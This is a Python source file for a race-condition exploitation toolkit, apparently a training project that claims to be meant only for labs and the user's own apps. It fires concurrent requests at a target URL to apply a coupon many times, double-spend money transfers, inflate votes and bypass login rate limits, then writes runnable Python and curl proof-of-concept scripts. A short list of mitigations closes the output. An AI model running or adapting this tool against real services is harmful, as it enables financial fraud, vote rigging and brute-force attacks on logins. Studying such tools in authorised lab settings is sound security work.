#!/usr/bin/env python3
"""
Race Condition & TOCTOU Exploitation Toolkit
Project #32: Race Condition Exploitation

LEGAL: Only test your own apps, PortSwigger labs, or DVWA.
"""

import sys
import os
import json
import time
import argparse
import datetime
import urllib3
import concurrent.futures
from urllib.parse import urljoin

import requests

from race_payloads import (
    RACE_TECHNIQUES, TEST_PAYLOADS,
    python_poc_template, curl_poc_template,
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    GREEN   = '\033[92m'
    RED     = '\033[91m'
    YELLOW  = '\033[93m'
    BLUE    = '\033[94m'
    CYAN    = '\033[96m'
    MAGENTA = '\033[95m'
    BOLD    = '\033[1m'
    RESET   = '\033[0m'

class RaceToolkit:
    def __init__(self, target, timeout=10, threads=50,
                 output_dir='.', verbose=False, cookie=None):
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        self.target = target
        self.timeout = timeout
        self.threads = threads
        self.output_dir = output_dir
        self.verbose = verbose

        os.makedirs(f"{output_dir}/race_pocs", exist_ok=True)

        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 Race Tool'})
        if cookie:
            self.session.headers['Cookie'] = cookie

        self.results = {
            'target': target,
            'timestamp': datetime.datetime.now().isoformat(),
            'vulnerable': False,
            'tests': [],
            'timing': {},
            'pocs': [],
            'error': None,
        }

    def _one(self, url, method, data):
        try:
            if method.upper() == 'POST':
                return self.session.post(url, data=data,
                                          timeout=self.timeout, verify=False)
            else:
                return self.session.get(url, params=data,
                                         timeout=self.timeout, verify=False)
        except Exception as e:
            if self.verbose:
                print(f"{Colors.YELLOW}[!] {str(e)[:60]}{Colors.RESET}")
            return None

    def _parallel(self, url, method, data, n):
        results = []

        def hit():
            r = self._one(url, method, data)
            results.append(r)

        with concurrent.futures.ThreadPoolExecutor(max_workers=n) as ex:
            futures = [ex.submit(hit) for _ in range(n)]
            concurrent.futures.wait(futures)
        return results

    def phase1_timing(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 1: TIMING ANALYSIS{Colors.RESET}")

        start = time.time()
        self._one(self.target, 'GET', {})
        baseline = time.time() - start
        print(f"    Baseline (1 request):    {baseline:.3f}s")

        start = time.time()
        self._parallel(self.target, 'GET', {}, 20)
        parallel_time = time.time() - start
        print(f"    20 parallel requests:    {parallel_time:.3f}s")

        speedup = (baseline * 20) / parallel_time if parallel_time > 0 else 0
        print(f"    Speedup vs sequential:   {speedup:.1f}x")

        self.results['timing'] = {
            'baseline_single': round(baseline, 3),
            'parallel_20': round(parallel_time, 3),
            'speedup': round(speedup, 2),
        }

        if speedup > 3:
            print(f"    {Colors.GREEN}[+] Server processes concurrently{Colors.RESET}")
        else:
            print(f"    {Colors.YELLOW}[~] Server may serialize{Colors.RESET}")

    def phase2_coupon(self, n=20):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 2: COUPON ABUSE{Colors.RESET}")
        url = urljoin(self.target, '/apply-coupon')
        data = {'code': 'SAVE50'}

        self._one(urljoin(self.target, '/reset-state'), 'GET', {})

        print(f"    [SEQUENTIAL] Applying {n} times, one by one:")
        seq_ok = 0
        for i in range(5):
            r = self._one(url, 'GET', data)
            if r and r.status_code == 200 and 'success' in r.text.lower():
                seq_ok += 1
                print(f"      Request {i+1}: SUCCESS")
            else:
                print(f"      Request {i+1}: FAILED")

        self._one(urljoin(self.target, '/reset-state'), 'GET', {})

        print(f"\n    [PARALLEL] Applying {n} simultaneously:")
        results = self._parallel(url, 'GET', data, n)
        par_ok = sum(1 for r in results
                     if r and r.status_code == 200 and 'success' in r.text.lower())
        print(f"      Successful: {par_ok}/{n}")

        race = par_ok > 1
        if race:
            print(f"      {Colors.RED}[!] RACE EXPLOITED! "
                  f"Discount applied {par_ok} times!{Colors.RESET}")
            self.results['vulnerable'] = True

        self.results['tests'].append({
            'type': 'coupon_abuse', 'url': url,
            'sequential_success': seq_ok, 'parallel_success': par_ok,
            'total': n, 'race_condition': race,
        })
        return race

    def phase3_transfer(self, amount=100, n=10):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 3: DOUBLE SPEND{Colors.RESET}")
        url = urljoin(self.target, '/transfer')
        data = {'amount': str(amount), 'to': 'attacker'}

        self._one(urljoin(self.target, '/reset-state'), 'GET', {})

        r = self._one(urljoin(self.target, '/state'), 'GET', {})
        if r:
            print(f"    Initial balance: ${json.loads(r.text).get('balance', '?')}")

        print(f"    Sending {n} transfers of ${amount} each...")
        results = self._parallel(url, 'GET', data, n)
        par_ok = sum(1 for r in results
                     if r and r.status_code == 200 and 'success' in r.text.lower())

        r = self._one(urljoin(self.target, '/state'), 'GET', {})
        final = json.loads(r.text).get('balance') if r else '?'
        print(f"    Successful:      {par_ok}/{n}")
        print(f"    Final balance:   ${final}")

        race = par_ok > 1
        if race:
            print(f"    {Colors.RED}[!] DOUBLE-SPEND EXPLOITED!{Colors.RESET}")
            self.results['vulnerable'] = True

        self.results['tests'].append({
            'type': 'double_spend', 'url': url,
            'successful_transfers': par_ok,
            'final_balance': final, 'race_condition': race,
        })
        return race

    def phase4_vote(self, n=50):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 4: VOTE MANIPULATION{Colors.RESET}")
        url = urljoin(self.target, '/vote')
        data = {'id': '123'}

        self._one(urljoin(self.target, '/reset-state'), 'GET', {})

        print(f"    Sending {n} votes in parallel...")
        results = self._parallel(url, 'GET', data, n)
        par_ok = sum(1 for r in results
                     if r and r.status_code == 200 and 'success' in r.text.lower())
        print(f"    Votes counted: {par_ok}/{n}")

        race = par_ok > 1
        if race:
            print(f"    {Colors.RED}[!] VOTE MANIPULATION EXPLOITED!{Colors.RESET}")
            self.results['vulnerable'] = True

        self.results['tests'].append({
            'type': 'vote_manipulation', 'url': url,
            'votes_counted': par_ok, 'total': n, 'race_condition': race,
        })
        return race

    def phase5_rate_limit(self, n=100):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 5: RATE LIMIT BYPASS{Colors.RESET}")
        url = urljoin(self.target, '/login')
        data = {'username': 'admin', 'password': 'wrong'}

        self._one(urljoin(self.target, '/reset-state'), 'GET', {})

        print(f"    [SEQUENTIAL] Testing rate limit...")
        blocked_at = None
        for i in range(10):
            r = self._one(url, 'GET', data)
            if r and r.status_code == 429:
                blocked_at = i + 1
                break
        print(f"      Blocked after: {blocked_at or '>10'} attempts")

        self._one(urljoin(self.target, '/reset-state'), 'GET', {})

        print(f"    [PARALLEL] Sending {n} login attempts...")
        results = self._parallel(url, 'GET', data, n)
        got = sum(1 for r in results if r and r.status_code in (200, 401))
        limited = sum(1 for r in results if r and r.status_code == 429)
        print(f"      Got through:   {got}/{n}")
        print(f"      Rate limited:  {limited}/{n}")

        bypass = got > (blocked_at or 5)
        if bypass:
            print(f"    {Colors.RED}[!] RATE LIMIT BYPASSED!{Colors.RESET}")
            self.results['vulnerable'] = True

        self.results['tests'].append({
            'type': 'rate_limit_bypass', 'url': url,
            'sequential_blocked_at': blocked_at,
            'parallel_got_through': got, 'bypass': bypass,
        })
        return bypass

    def phase6_pocs(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 6: POC GENERATION{Colors.RESET}")

        targets = [
            ('coupon',   '/apply-coupon', 'GET', {'code': 'SAVE50'}, 20),
            ('transfer', '/transfer',     'GET', {'amount': '100', 'to': 'attacker'}, 10),
            ('vote',     '/vote',         'GET', {'id': '123'}, 50),
            ('login',    '/login',        'GET', {'username': 'admin', 'password': 'wrong'}, 100),
        ]

        for name, path, method, data, threads in targets:
            url = urljoin(self.target, path)

            py_content = python_poc_template(url, method, data, threads)
            py_path = f"{self.output_dir}/race_pocs/poc_{name}.py"
            with open(py_path, 'w') as f:
                f.write(py_content)
            os.chmod(py_path, 0o755)

            sh_content = curl_poc_template(url, method, data)
            sh_path = f"{self.output_dir}/race_pocs/poc_{name}.sh"
            with open(sh_path, 'w') as f:
                f.write(sh_content)
            os.chmod(sh_path, 0o755)

            print(f"      {Colors.GREEN}✓{Colors.RESET} poc_{name}.py ({threads} threads)")
            print(f"      {Colors.GREEN}✓{Colors.RESET} poc_{name}.sh")

            self.results['pocs'].append({
                'name': name, 'python': py_path, 'shell': sh_path, 'threads': threads,
            })

    def save_reports(self):
        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        json_path = f"{self.output_dir}/race_report_{ts}.json"
        with open(json_path, 'w') as f:
            json.dump(self.results, f, indent=2, default=str)
        print(f"\n{Colors.GREEN}[✓] JSON report: {json_path}{Colors.RESET}")

    def print_summary(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] EXPLOITATION SUMMARY{Colors.RESET}")
        print(f"    Vulnerability:  Race Condition (TOCTOU + Concurrent)")
        print(f"    Tests run:      {len(self.results['tests'])}")
        print(f"    PoCs generated: {len(self.results['pocs'])}")

        sev_color = Colors.RED if self.results['vulnerable'] else Colors.GREEN
        sev = 'HIGH to CRITICAL' if self.results['vulnerable'] else 'LOW'
        print(f"    Vulnerable:     {sev_color}{sev}{Colors.RESET}")

        print(f"\n    {Colors.YELLOW}Mitigation:{Colors.RESET}")
        print(f"        1. Database locks (SELECT FOR UPDATE)")
        print(f"        2. Atomic operations (transactions)")
        print(f"        3. Idempotency keys")
        print(f"        4. Rate limiting (per user + IP)")
        print(f"        5. Mutex/semaphore for critical sections")

    def run(self):
        print("\n" + "=" * 70)
        print(f"{Colors.BOLD}{Colors.MAGENTA}Race Condition & TOCTOU Exploitation Toolkit{Colors.RESET}")
        print("=" * 70)
        print(f"{Colors.BOLD}Target:  {self.target}{Colors.RESET}")
        print(f"{Colors.BOLD}Threads: {self.threads}{Colors.RESET}")

        self.phase1_timing()
        self.phase2_coupon()
        self.phase3_transfer()
        self.phase4_vote()
        self.phase5_rate_limit()
        self.phase6_pocs()

        self.print_summary()
        self.save_reports()

def main():
    p = argparse.ArgumentParser(description="Race Condition Toolkit (Project #32)")
    p.add_argument('url', help='Target URL')
    p.add_argument('--cookie', help='Cookie header')
    p.add_argument('--threads', type=int, default=50)
    p.add_argument('--timeout', type=int, default=10)
    p.add_argument('-o', '--output', default='.')
    p.add_argument('-v', '--verbose', action='store_true')

    args = p.parse_args()

    print(f"{Colors.CYAN}{Colors.BOLD}")
    print("=" * 70)
    print("  RACE CONDITION EXPLOITATION")
    print("  Project #32: Race Condition & TOCTOU Toolkit")
    print("=" * 70)
    print(f"{Colors.RESET}")

    toolkit = RaceToolkit(
        target=args.url,
        timeout=args.timeout,
        threads=args.threads,
        output_dir=args.output,
        verbose=args.verbose,
        cookie=args.cookie,
    )
    toolkit.run()

if __name__ == '__main__':
    main()